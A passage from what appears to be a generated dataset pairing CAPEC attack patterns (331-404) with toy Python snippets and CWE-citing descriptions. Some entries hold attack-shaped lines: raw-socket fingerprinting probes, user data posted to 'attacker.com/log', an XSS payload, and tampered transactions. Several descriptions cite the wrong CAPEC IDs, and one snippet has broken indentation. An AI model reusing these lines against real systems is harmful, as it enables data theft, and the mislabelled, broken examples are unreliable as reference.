        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# IP header fields\nip_header = b'\\x45\\x00\\x00\\x1c'  # Version, IHL, Type of Service | Total Length\nip_header += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\nip_header += b'\\x40\\x01\\x00\\x00'  # TTL, Protocol | Header Checksum\nip_header += b'\\x7f\\x00\\x00\\x01'  # Source IP Address\nip_header += b'\\x7f\\x00\\x00\\x01'  # Destination IP Address\n\n# ICMP header fields\nicmp_header = b'\\x08\\x00\\x4d\\x62'  # Type, Code | Checksum\nicmp_header += b'\\x00\\x01\\x00\\x01'  # Identifier, Sequence Number\n\n# Send the packet\nsock.sendto(ip_header + icmp_header, ('127.0.0.1', 0))\n\n# Receive the response\nresponse, _ = sock.recvfrom(1024)\n\n# Extract the total length field from the IP header of the response\ntotal_length = response[2:4]\nprint(f'Total Length Field: {int.from_bytes(total_length, byteorder=\"big\")}')",
        "description": "This Python code snippet demonstrates the concept of the 'ICMP IP Total Length Field Probe' attack. It creates a raw socket to send an ICMP echo request to a target machine (localhost in this case). The IP header is crafted with specific fields, including the total length field. The code then sends the packet and waits for a response. Upon receiving the response, it extracts and prints the total length field from the IP header of the response. This process can be used to identify discrepancies in responses from different operating systems, which can reveal internal state information (CWE-204) and potentially exploit improper handling of length parameters (CWE-130). The code also highlights the lack of integrity checks (CWE-353, CWE-924) and the transmission of data in cleartext (CWE-319)."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n\n# Set the IP header fields\nip_header = b'\\x45\\x00\\x00\\x1c'  # Version, IHL, Type of Service | Total Length\nip_header += b'\\x1c\\x46'  # Identification (ID) field\nip_header += b'\\x40\\x00\\x40\\x11\\x00\\x00'  # Flags, Fragment Offset | TTL, Protocol, Header Checksum\nip_header += socket.inet_aton('192.168.1.1')  # Source IP\nip_header += socket.inet_aton('192.168.1.2')  # Destination IP\n\n# Set the UDP header fields\nudp_header = b'\\x00\\x35\\x00\\x00'  # Source Port, Destination Port\nudp_header += b'\\x00\\x08\\x00\\x00'  # Length, Checksum\n\n# Combine headers to form the packet\npacket = ip_header + udp_header\n\n# Send the packet to a closed port\nsock.sendto(packet, ('192.168.1.2', 0))\n\n# Receive the ICMP error message\nresponse = sock.recv(1024)\n\n# Print the received ICMP error message\nprint(response)",
        "description": "This Python code snippet demonstrates the concept of the CAPEC 'ICMP IP 'ID' Field Error Message Probe'. It creates a raw socket and constructs a UDP packet with a specific IP identification (ID) field. The packet is sent to a closed port on a target machine. The code then listens for an ICMP error message in response. The received ICMP error message can be analyzed to observe how the IP ID field is echoed back, which can help in fingerprinting the target OS. This snippet also touches on related CWEs such as 'Observable Response Discrepancy' (CWE-204) by revealing internal state information through the ICMP error message, and 'Externally-Generated Error Message Containing Sensitive Information' (CWE-211) by handling error messages that may contain sensitive system information."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "import requests\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated event hosting endpoint\n@app.route('/host_event', methods=['POST'])\ndef host_event():\n    event_data = request.json\n    # Log user information in cleartext (CWE-319)\n    with open('user_data.txt', 'a') as f:\n        f.write(f\"UserID: {event_data['user_id']}, Username: {event_data['username']}\\n\")\n    return jsonify({'status': 'Event hosted successfully'})\n\n# Simulated event participation endpoint\n@app.route('/join_event', methods=['POST'])\ndef join_event():\n    user_data = request.json\n    # Transmit sensitive data in cleartext (CWE-319)\n    response = requests.post('http://attacker.com/log', json=user_data)\n    return jsonify({'status': 'Joined event successfully'})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has two endpoints: '/host_event' and '/join_event'. The '/host_event' endpoint allows an adversary to host an event and log user information (user_id and username) in cleartext to a file (CWE-319). The '/join_event' endpoint simulates users joining the event and transmits their sensitive data in cleartext to an external server controlled by the attacker (CWE-319). This setup embodies the main idea of CAPEC-94, where an adversary can harvest information via API event monitoring. The code also highlights the lack of encryption and protection of sensitive data, making it vulnerable to interception and misuse."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import requests\n\n# Simulate a client-side request to a server\nresponse = requests.get('http://example.com/api/data')\n\n# CWE-311: Missing Encryption of Sensitive Data\n# The response data is not encrypted\nsensitive_data = response.text\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# The client does not verify the authenticity of the data\nif 'malicious_content' in sensitive_data:\n    print('Malicious content detected!')\nelse:\n    print('Data seems fine.')\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The client is responsible for enforcing security checks\n# CWE-346: Origin Validation Error\n# The client does not validate the origin of the data\nif response.url == 'http://example.com/api/data':\n    print('Data from trusted source.')\nelse:\n    print('Data from untrusted source.')\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# The attacker can modify the data in transit\nmodified_data = sensitive_data.replace('safe_content', 'malicious_content')\n\n# Simulate sending the modified data back to the server\nrequests.post('http://example.com/api/data', data={'data': modified_data})",
        "description": "This Python code snippet demonstrates a scenario where an attacker can manipulate API messages between a client and a server. The client makes a request to the server and receives sensitive data that is not encrypted (CWE-311). The client does not verify the authenticity of the data (CWE-345) and relies on the client-side to enforce security checks (CWE-602). Additionally, the client does not validate the origin of the data (CWE-346). The attacker can modify the assumed-immutable data (CWE-471) and send it back to the server, potentially gaining unauthorized privileges or conducting further attacks. This code embodies the main idea of CAPEC-94, where the attack is directed at the server through manipulation of client-side data in an application framework."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import requests\n\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-471: Modification of Assumed-Immutable Data\n\n# Simulated API endpoint for a transaction\napi_endpoint = 'http://example.com/api/transaction'\n\n# Original transaction data\ntransaction_data = {\n    'sender': 'user123',\n    'receiver': 'user456',\n    'amount': 100,\n    'currency': 'USD'\n}\n\n# Attacker intercepts and modifies the transaction data\n# CWE-471: Modification of Assumed-Immutable Data\ntransaction_data['receiver'] = 'attacker789'\ntransaction_data['amount'] = 1000\n\n# Sending the modified transaction data\nresponse = requests.post(api_endpoint, json=transaction_data)\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\nif response.status_code == 200:\n    print('Transaction successful')\nelse:\n    print('Transaction failed')",
        "description": "This Python code snippet demonstrates a scenario where an attacker intercepts and modifies transaction data before it is sent to an API endpoint. The original transaction data includes sender, receiver, amount, and currency. The attacker changes the receiver and amount fields, exploiting CWE-471 (Modification of Assumed-Immutable Data). The modified data is then sent to the server without proper encryption (CWE-311) and without sufficient verification of data authenticity (CWE-345) or origin validation (CWE-346). The server relies on the client to enforce security (CWE-602), making it vulnerable to such attacks. This code represents the main idea of CAPEC-Transaction or Event Tampering via Application API Manipulation."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# CWE-345: Insufficient Verification of Data Authenticity\n@app.route('/redirect', methods=['GET'])\ndef redirect_user():\n    target_url = request.args.get('target')\n    if not target_url:\n        return 'No target URL provided', 400\n    # CWE-346: Origin Validation Error\n    if 'trusted.com' not in target_url:\n        return 'Untrusted target URL', 400\n    return redirect(target_url)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n@app.route('/profile', methods=['POST'])\ndef update_profile():\n    user_id = request.form.get('user_id')\n    new_image_url = request.form.get('image_url')\n    # CWE-471: Modification of Assumed-Immutable Data (MAID)\n    # CWE-311: Missing Encryption of Sensitive Data\n    # Assume user_id is immutable and sensitive, but it's not verified or encrypted\n    if not user_id or not new_image_url:\n        return 'Invalid input', 400\n    # Simulate updating the user's profile image\n    return f'Profile image updated to {new_image_url} for user {user_id}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that embodies the main idea of CAPEC-160: Application API Navigation Remapping. The code includes two routes: '/redirect' and '/profile'. The '/redirect' route takes a 'target' URL parameter and redirects the user to that URL without sufficient verification of its authenticity (CWE-345) and origin (CWE-346), potentially allowing an attacker to redirect users to malicious sites. The '/profile' route simulates updating a user's profile image based on user input, but it relies on client-side enforcement of security (CWE-602) and does not properly protect assumed-immutable data (CWE-471) or encrypt sensitive data (CWE-311). This setup can be exploited to manipulate navigation and content, leading to phishing attacks or other malicious activities."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import requests\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-311: Missing Encryption of Sensitive Data\n\n# Simulate a client-side request to a server\nurl = 'http://example.com/api/data'\n\n# CWE-311: Sensitive data sent without encryption\nresponse = requests.get(url)\n\n# CWE-345 and CWE-346: No verification of data authenticity or origin\nif response.status_code == 200:\n    data = response.json()\n    # CWE-471: Modification of Assumed-Immutable Data\n    # Malicious actor intercepts and modifies the data\n    if 'user_role' in data:\n        data['user_role'] = 'admin'  # Elevate privileges\n\n    # Simulate sending the modified data back to the server\n    # CWE-602: Client-side enforcement of server-side security\n    requests.post(url, json=data)\n",
        "description": "This Python code snippet demonstrates a scenario where an adversary manipulates client-server communication to propagate malicious content. The client sends a request to a server without encrypting sensitive data (CWE-311). The response is received without verifying the authenticity or origin of the data (CWE-345 and CWE-346). The adversary then modifies an assumed-immutable element in the response (CWE-471), such as elevating a user's role to 'admin'. Finally, the modified data is sent back to the server, relying on client-side enforcement of security mechanisms (CWE-602). This embodies the main idea of CAPEC 'Navigation Remapping To Propagate Malicious Content' by showing how an attacker can manipulate data to circumvent expected application logic."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import requests\n\n# Simulate a client-side API call\nresponse = requests.get('http://example.com/api/getButtons')\n\n# CWE-345: Insufficient Verification of Data Authenticity\nif response.status_code == 200:\n    buttons = response.json().get('buttons', [])\n    for button in buttons:\n        # CWE-471: Modification of Assumed-Immutable Data (MAID)\n        if 'url' in button:\n            # Attacker modifies the button URL\n            button['url'] = 'http://attacker.com/malicious'\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The client is responsible for rendering the buttons\nfor button in buttons:\n    print(f\"<button onclick=\\\"location.href='{button['url']}'\\\">{button['label']}</button>\")",
        "description": "This Python code snippet demonstrates a scenario where an attacker manipulates the data received from an API to hijack buttons displayed to the user. The code fetches button data from an API endpoint and fails to verify the authenticity of the data (CWE-345). It then modifies the URL of the buttons (CWE-471), redirecting them to an attacker-controlled destination. The client-side code is responsible for rendering the buttons (CWE-602), which should be a server-side responsibility. This represents the main idea of CAPEC-Application API Button Hijacking, where an attacker manipulates API data to change the destination of buttons, leading to potential security risks."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import requests\n\n# Vulnerable API endpoint\napi_url = 'http://example.com/api/data'\n\n# Attacker's manipulated data\nmanipulated_data = {\n    'user_id': '12345',\n    'content': '<script>alert(\"Hacked!\")</script>'\n}\n\n# Sending manipulated data to the API\nresponse = requests.post(api_url, json=manipulated_data)\n\n# Print the response from the server\nprint(response.text)",
        "description": "This Python code snippet demonstrates a basic example of 'Content Spoofing Via Application API Manipulation' (CAPEC-111). The code sends manipulated data to a vulnerable API endpoint. The manipulated data includes a user ID and a script tag designed to execute a JavaScript alert, simulating a content spoofing attack. This attack leverages the lack of integrity checks (CWE-353) and relies on the server trusting client-side data (CWE-602). The server processes the manipulated data without proper validation, potentially leading to the execution of malicious content. This example highlights the importance of server-side validation and integrity checks to prevent such attacks."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import os\nimport time\n\nclass PhysicalSecurityBypass:\n    def __init__(self, lock_status=True, alarm_status=True):\n        self.lock_status = lock_status\n        self.alarm_status = alarm_status\n\n    def bypass_lock(self):\n        # Simulate bypassing the lock\n        self.lock_status = False\n        print('Lock bypassed.')\n\n    def disable_alarm(self):\n        # Simulate disabling the alarm\n        self.alarm_status = False\n        print('Alarm disabled.')\n\n    def access_sensitive_area(self):\n        if not self.lock_status and not self.alarm_status:\n            print('Accessing sensitive area...')\n            # Simulate accessing sensitive information\n            sensitive_info = 'Sensitive Data'\n            print(f'Accessed: {sensitive_info}')\n        else:\n            print('Access denied. Lock or alarm is active.')\n\n# Example usage\nbypass = PhysicalSecurityBypass()\nbypass.bypass_lock()\ntime.sleep(1)  # Simulate time taken to bypass lock\nbypass.disable_alarm()\ntime.sleep(1)  # Simulate time taken to disable alarm\nbypass.access_sensitive_area()",
        "description": "This Python code snippet simulates the process of bypassing physical security mechanisms, such as locks and alarms, to access a sensitive area. The 'PhysicalSecurityBypass' class has methods to bypass a lock and disable an alarm, representing the CAPEC's main idea of evading physical security measures. The 'access_sensitive_area' method checks if both the lock and alarm are disabled before granting access to sensitive information, highlighting the vulnerabilities described in the related CWEs, such as improper physical access control and insufficient protection mechanisms."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "class PhysicalLock:\n    def __init__(self, lock_bit=True):\n        self.lock_bit = lock_bit\n        self.locked = True\n\n    def unlock(self, force=False):\n        if force:\n            print('Lock forced open!')\n            self.locked = False\n        elif not self.lock_bit:\n            print('Lock bit modified, lock opened!')\n            self.locked = False\n        else:\n            print('Failed to unlock, lock bit is set.')\n\n    def access(self):\n        if not self.locked:\n            print('Access granted.')\n        else:\n            print('Access denied, lock is engaged.')\n\n# Example usage\nlock = PhysicalLock()\nlock.unlock(force=True)  # Simulate lock forcing\nlock.access()\n\nlock = PhysicalLock(lock_bit=False)\nlock.unlock()  # Simulate lock bit modification\nlock.access()",
        "description": "This Python code snippet represents a simplified model of a physical lock mechanism, embodying the main idea of CAPEC-170: Bypassing Physical Locks. The `PhysicalLock` class simulates a lock with a `lock_bit` attribute that represents whether the lock bit is set (indicating the lock is secure). The `unlock` method allows the lock to be opened either by force (simulating lock forcing techniques) or by modifying the lock bit (simulating improper prevention of lock bit modification). The `access` method checks if the lock is engaged and grants or denies access accordingly. This code demonstrates vulnerabilities such as improper physical access control and the ability to override locks through force or modification, aligning with the related CWEs."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "class Lock:\n    def __init__(self):\n        self.locked = True\n        self.lock_bit = 0x1  # Improper Prevention of Lock Bit Modification (CWE-1231)\n        self.key = 'hardcoded_key'  # Use of Hard-coded Cryptographic Key (CWE-321)\n\n    def unlock(self, bump_key):\n        if bump_key == 'bump_key':\n            self.lock_bit = 0x0  # Simulate lock bit modification\n            self.locked = False\n            print('Lock opened!')\n        else:\n            print('Failed to open lock.')\n\n    def power_transition(self):\n        self.lock_bit = 0x1  # Improper Lock Behavior After Power State Transition (CWE-1232)\n        print('Power state transitioned, lock bit reset.')\n\n# Simulate lock bumping attack\nlock = Lock()\nprint(f'Initial lock state: {lock.locked}')\nlock.unlock('bump_key')\nprint(f'Lock state after bumping: {lock.locked}')\n\n# Simulate power state transition\nlock.power_transition()\nprint(f'Lock state after power transition: {lock.locked}')",
        "description": "This Python code snippet simulates a lock mechanism that can be compromised using a 'bump key', representing the concept of Lock Bumping (CAPEC). The lock has a 'lock_bit' that is improperly protected (CWE-1231) and can be modified to unlock the lock. The lock also uses a hard-coded key (CWE-321), which is a security weakness. The 'unlock' method simulates the use of a bump key to open the lock by modifying the lock bit. The 'power_transition' method simulates a power state transition that resets the lock bit, representing improper lock behavior after power state transitions (CWE-1232). The code demonstrates how an attacker can exploit these weaknesses to gain unauthorized access."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.locked = False\n\n    def lock(self):\n        if not self.locked:\n            self.locked = True\n        else:\n            raise Exception('Resource already locked')\n\n    def unlock(self):\n        if self.locked:\n            self.locked = False\n        else:\n            raise Exception('Unlocking a resource that is not locked')\n\nclass Resource:\n    def __init__(self):\n        self.lock = Lock()\n        self.data = 'Sensitive Data'\n\n    def access(self):\n        if not self.lock.locked:\n            return self.data\n        else:\n            raise Exception('Resource is locked')\n\n# Simulating lock picking by bypassing the lock mechanism\nresource = Resource()\n\n# Bypassing the lock\nresource.lock.locked = False  # CWE-1231: Improper Prevention of Lock Bit Modification\n\n# Accessing the resource without proper unlocking\nprint(resource.access())  # Should print 'Sensitive Data'\n\n# Attempting to unlock an already unlocked resource\ntry:\n    resource.lock.unlock()  # CWE-832: Unlock of a Resource that is not Locked\nexcept Exception as e:\n    print(e)\n\n# Simulating deadlock scenario\nlock1 = threading.Lock()\nlock2 = threading.Lock()\n\ndef thread1():\n    with lock1:\n        with lock2:\n            print('Thread 1 acquired both locks')\n\ndef thread2():\n    with lock2:\n        with lock1:\n            print('Thread 2 acquired both locks')\n\n# Creating threads\nt1 = threading.Thread(target=thread1)\n t2 = threading.Thread(target=thread2)\n\n# Starting threads\n t1.start()\n t2.start()\n\n# Joining threads\n t1.join()\n t2.join()",
        "description": "This Python code snippet demonstrates the concept of lock picking and related weaknesses in a software context. The `Lock` class simulates a lock mechanism with methods to lock and unlock a resource. The `Resource` class uses this lock to protect access to sensitive data. The code then simulates a lock picking attack by directly modifying the lock state (CWE-1231: Improper Prevention of Lock Bit Modification) and accessing the resource without proper unlocking. It also demonstrates an attempt to unlock an already unlocked resource (CWE-832: Unlock of a Resource that is not Locked). Additionally, the code includes a deadlock scenario (CWE-833: Deadlock) using threading, where two threads attempt to acquire two locks in different orders, leading to a potential deadlock situation."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "import threading\n\nclass Lock:\n    def __init__(self):\n        self.locked = False\n        self.lock = threading.Lock()\n\n    def acquire(self):\n        with self.lock:\n            if not self.locked:\n                self.locked = True\n                print('Lock acquired')\n            else:\n                print('Lock already acquired')\n\n    def release(self):\n        with self.lock:\n            if self.locked:\n                self.locked = False\n                print('Lock released')\n            else:\n                print('Lock already released')\n\n    def force_unlock(self):\n        with self.lock:\n            self.locked = False\n            print('Lock forced open')\n\n# Simulating improper lock behavior after power state transition\nlock = Lock()\nlock.acquire()\nlock.force_unlock()  # Forcing the lock open, similar to using a Snap Gun\nlock.acquire()  # Re-acquiring the lock after forced unlock",
        "description": "This Python code snippet simulates the concept of using a Snap Gun to force a lock open, as described in the CAPEC. The `Lock` class represents a lock with methods to acquire, release, and forcefully unlock it. The `force_unlock` method simulates the action of a Snap Gun by forcibly setting the lock state to unlocked, regardless of its current state. This is analogous to the Snap Gun's ability to force the lock into an unlocked position. The code also demonstrates improper lock behavior after a power state transition (CWE-1232) by allowing the lock to be re-acquired after being forcefully unlocked. This represents a security vulnerability where the lock's state can be manipulated inappropriately, similar to the vulnerabilities described in the related CWEs."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import hashlib\n\n# Simulate a hard-coded cryptographic key (CWE-321)\nHARD_CODED_KEY = 'hardcodedkey123'\n\n# Simulate a broken cryptographic algorithm (CWE-327)\ndef broken_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate generating a magnetic strip card using the broken algorithm\n# and hard-coded key\ncard_data = 'user123'\ncard_hash = broken_hash(card_data + HARD_CODED_KEY)\n\nprint(f'Generated card hash: {card_hash}')\n\n# Simulate an attacker reverse-engineering the card hash\n# and generating a new card (CWE-1278)\nattacker_data = 'attacker'\nattacker_hash = broken_hash(attacker_data + HARD_CODED_KEY)\n\nprint(f'Attacker generated card hash: {attacker_hash}')",
        "description": "This Python code snippet demonstrates a simplified scenario of bypassing electronic locks and access controls by exploiting weak cryptographic practices. The code uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (MD5, CWE-327) to generate a hash for a magnetic strip card. An attacker can reverse-engineer the card hash and generate a new card by using the same broken algorithm and hard-coded key, thus bypassing the access control mechanism. This example highlights the vulnerabilities associated with using insecure cryptographic methods and hard-coded keys in electronic access control systems."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import hashlib\nimport os\n\n# Simulate storing a hashed password (using a weak hash algorithm)\nstored_password_hash = hashlib.md5('securepassword'.encode()).hexdigest()\n\n# Simulate an attacker capturing and replaying the hashed password\ncaptured_hash = stored_password_hash\n\n# Authentication function\ndef authenticate(input_hash):\n    if input_hash == stored_password_hash:\n        return 'Authentication Successful'\n    else:\n        return 'Authentication Failed'\n\n# Attacker replays the captured hash\nresult = authenticate(captured_hash)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-294: Authentication Bypass by Capture-replay and CWE-327: Use of a Broken or Risky Cryptographic Algorithm. The code simulates storing a password hash using the weak MD5 algorithm and an attacker capturing and replaying this hash to bypass authentication. The `authenticate` function checks if the input hash matches the stored hash, and the attacker successfully bypasses authentication by replaying the captured hash. This highlights the risks of using weak cryptographic algorithms and the potential for capture-replay attacks."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import copy\n\nclass MagStripeCard:\n    def __init__(self, card_number, expiration_date, cvv):\n        self.card_number = card_number\n        self.expiration_date = expiration_date\n        self.cvv = cvv\n\n    def clone(self):\n        return copy.deepcopy(self)\n\n# Example usage\noriginal_card = MagStripeCard('1234-5678-9012-3456', '12/25', '123')\ncloned_card = original_card.clone()\n\nprint(f'Original Card: {original_card.card_number}, {original_card.expiration_date}, {original_card.cvv}')\nprint(f'Cloned Card: {cloned_card.card_number}, {cloned_card.expiration_date}, {cloned_card.cvv}')",
        "description": "This Python code snippet demonstrates the concept of cloning a magnetic stripe card, which is the main idea of the CAPEC 'Cloning Magnetic Strip Cards'. The `MagStripeCard` class contains sensitive information such as card number, expiration date, and CVV. The `clone` method uses the `copy.deepcopy` function to create an exact duplicate of the card, embodying CWE-498 'Cloneable Class Containing Sensitive Information'. This represents the vulnerability where an attacker can easily duplicate a magstripe card by cloning the class containing sensitive data. The example usage shows how an original card can be cloned, highlighting the ease of unauthorized duplication."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import random\nimport string\n\n# Simulate a magnetic strip card with a simple string\nclass MagneticStripCard:\n    def __init__(self, card_number):\n        self.card_number = card_number\n\n# Function to generate a new card number by brute force\n# This is a simplified example and does not represent real-world complexity\ndef brute_force_card(existing_cards):\n    while True:\n        new_card_number = ''.join(random.choices(string.digits, k=16))\n        if new_card_number not in existing_cards:\n            return new_card_number\n\n# Example usage\nexisting_cards = [MagneticStripCard('1234567890123456'), MagneticStripCard('6543210987654321')]\nexisting_card_numbers = [card.card_number for card in existing_cards]\n\nnew_card_number = brute_force_card(existing_card_numbers)\nprint(f'Generated new card number: {new_card_number}')",
        "description": "This Python code snippet simulates a brute force attack on magnetic strip cards. It defines a `MagneticStripCard` class to represent a card and a `brute_force_card` function that generates a new card number by randomly selecting digits until a unique number is found. This represents the CAPEC idea of generating new valid card sequences for unauthorized access. The code also indirectly touches on CWE-307 (Improper Restriction of Excessive Authentication Attempts) by not limiting the number of attempts to generate a valid card number."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import random\n\nclass RFIDChip:\n    def __init__(self, identifier):\n        self.identifier = identifier\n\n    def get_signal(self):\n        # Simulate signal with identifier\n        return f'SIGNAL-{self.identifier}'\n\nclass RFIDCloner:\n    def clone(self, chip):\n        # Capture the signal from the original chip\n        captured_signal = chip.get_signal()\n        # Extract the identifier from the signal\n        cloned_identifier = captured_signal.split('-')[1]\n        # Create a new chip with the cloned identifier\n        return RFIDChip(cloned_identifier)\n\n# Simulate the process\noriginal_chip = RFIDChip(random.randint(1000, 9999))\ncloner = RFIDCloner()\ncloned_chip = cloner.clone(original_chip)\n\nprint(f'Original Chip Signal: {original_chip.get_signal()}')\nprint(f'Cloned Chip Signal: {cloned_chip.get_signal()}')",
        "description": "This Python code snippet demonstrates the concept of cloning RFID cards or chips, as described in the CAPEC. The `RFIDChip` class simulates an RFID chip with a unique identifier. The `get_signal` method returns a signal that includes this identifier. The `RFIDCloner` class captures the signal from an original chip, extracts the identifier, and creates a new chip with the same identifier, effectively cloning the original chip. This process highlights the vulnerability of RFID systems to cloning attacks, where an attacker can duplicate the RFID signal and gain unauthorized access. The code also touches on related CWEs, such as insecure security identifier mechanisms and the use of duplicate identifiers."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "class RFIDChip:\n    def __init__(self, id):\n        self.id = id\n        self.active = True\n        self.debug_mode = False\n\n    def deactivate(self):\n        if self.debug_mode:\n            self.active = False\n            print(f'RFID Chip {self.id} deactivated.')\n        else:\n            print('Access Denied: Debug mode not enabled.')\n\n    def enable_debug_mode(self):\n        self.debug_mode = True\n        print('Debug mode enabled.')\n\n# Example usage\nrfid_chip = RFIDChip('12345')\nrfid_chip.enable_debug_mode()  # CWE-1191: Improper access control to debug mode\nrfid_chip.deactivate()  # Deactivates the RFID chip\n",
        "description": "This Python code snippet represents the concept of 'RFID Chip Deactivation or Destruction' (CAPEC) by simulating the deactivation of an RFID chip through a debug mode interface. The RFIDChip class has methods to enable debug mode and deactivate the chip. The deactivation method checks if the debug mode is enabled before deactivating the chip, illustrating CWE-1191 (On-Chip Debug and Test Interface With Improper Access Control). If an attacker can improperly access the debug mode, they can deactivate the RFID chip, rendering it unresponsive. This snippet highlights the vulnerability of improper access control to critical functions within the chip."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "import os\nimport time\n\nclass HardwareDevice:\n    def __init__(self):\n        self.secure_data = 'Sensitive Information'\n        self.debug_mode = False\n\n    def enable_debug_mode(self):\n        # CWE-1313: Allowing activation of debug logic at runtime\n        self.debug_mode = True\n        print('Debug mode enabled')\n\n    def read_secure_data(self):\n        if self.debug_mode:\n            # CWE-1300: Exposing sensitive information via side channels\n            print(f'Accessing secure data: {self.secure_data}')\n        else:\n            print('Access denied: Debug mode not enabled')\n\n    def simulate_voltage_glitch(self):\n        # CWE-1247: Improper protection against voltage and clock glitches\n        print('Simulating voltage glitch...')\n        time.sleep(1)\n        self.enable_debug_mode()\n\n# Simulating physical access and attack\nhardware = HardwareDevice()\nprint('Attempting to access secure data without debug mode:')\nhardware.read_secure_data()\n\nprint('\\nSimulating physical attack to enable debug mode:')\nhardware.simulate_voltage_glitch()\n\nprint('\\nAttempting to access secure data after enabling debug mode:')\nhardware.read_secure_data()",
        "description": "This Python code snippet simulates a hardware device with a secure data storage mechanism. The device has a debug mode that can be enabled at runtime (CWE-1313), which allows access to sensitive information. The code also simulates a physical attack by inducing a voltage glitch (CWE-1247) to enable the debug mode. This represents the CAPEC scenario where an adversary exploits physical access to hardware to undermine the system's integrity and access sensitive data. The code demonstrates how improper physical access control and insufficient protection against physical attacks can lead to security vulnerabilities."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "class ATADrive:\n    def __init__(self, password):\n        self.password = password\n        self.locked = True\n\n    def authenticate(self, input_password):\n        if input_password == self.password:\n            self.locked = False\n            return True\n        return False\n\n    def update_password(self, new_password):\n        # Vulnerability: Allows password update without authentication\n        self.password = new_password\n        print(\"Password updated successfully.\")\n\n# Example usage\nata_drive = ATADrive(\"securepassword\")\n\n# Bypassing authentication to update password\nata_drive.update_password(\"newpassword\")\n\n# Now attempting to authenticate with the new password\nif ata_drive.authenticate(\"newpassword\"):\n    print(\"Access granted.\")\nelse:\n    print(\"Access denied.\")",
        "description": "This Python code snippet represents a simplified model of an ATA drive with a security vulnerability. The `ATADrive` class has methods for authentication and updating the password. The `update_password` method allows changing the password without requiring prior authentication, embodying the main idea of the CAPEC 'Bypassing ATA Password Security'. This vulnerability is related to CWE-285 (Improper Authorization) as it does not check if the user is authorized before allowing a password change. The code demonstrates how an attacker could exploit this flaw by updating the password without knowing the original one, thereby gaining unauthorized access to the drive."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import os\nimport logging\n\n# CWE-532: Information Exposure Through Server Log Files\nlogging.basicConfig(filename='server.log', level=logging.INFO)\n\n# CWE-287: Authentication Bypass Issues\n# Simulated authentication check\nuser_authenticated = False\n\n# CWE-493: Failure to provide confidentiality for stored data\n# Storing sensitive data without encryption\nsensitive_data = 'user_password=12345'\n\n# Log sensitive information (vulnerable practice)\nlogging.info(f'User authentication status: {user_authenticated}')\nlogging.info(f'Stored data: {sensitive_data}')\n\n# Simulated DNS lookup (CWE-350)\ndef dns_lookup(domain):\n    # Vulnerable to DNS spoofing attacks\n    return '192.168.1.1'\n\nip_address = dns_lookup('example.com')\nlogging.info(f'DNS lookup result for example.com: {ip_address}')",
